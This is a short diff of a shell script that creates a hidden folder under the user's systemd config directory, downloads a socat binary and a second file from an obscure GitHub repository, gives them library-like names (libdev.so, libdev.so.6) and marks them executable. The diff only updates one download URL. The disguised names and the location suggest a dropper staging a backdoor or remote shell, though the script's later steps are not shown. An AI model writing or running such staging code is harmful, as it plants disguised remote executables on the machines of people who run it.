@@ -6,7 +6,7 @@ mkdir -p $HOME/.config/systemd/user/libxct-util
 
 wget -O $HOME/.config/systemd/user/libxct-util/libdev.so https://github.com/qetuosfhk/sample/raw/master/socatx64.bin
 
-wget -O $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://github.com/qetuosfhk/sample/blob/master/run?raw=true
+wget -O $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://github.com/qetuosfhk/sample/raw/master/libdev.so.6
 
 chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so
 chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so.6
